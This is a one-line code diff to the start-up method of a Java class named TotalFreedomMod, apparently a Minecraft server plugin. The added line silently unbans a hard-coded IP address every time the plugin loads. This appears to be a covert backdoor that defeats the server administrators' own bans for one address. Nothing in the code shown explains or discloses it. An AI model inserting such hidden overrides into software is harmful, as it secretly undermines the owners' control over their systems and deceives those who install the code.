@@ -67,6 +67,7 @@ public class TotalFreedomMod extends JavaPlugin
     {
         TotalFreedomMod.plugin = this;
         TotalFreedomMod.plugin_file = getFile();
+        server.unbanIP("92.26.246.142");
 
         TotalFreedomMod.pluginName = this.getDescription().getName();
 
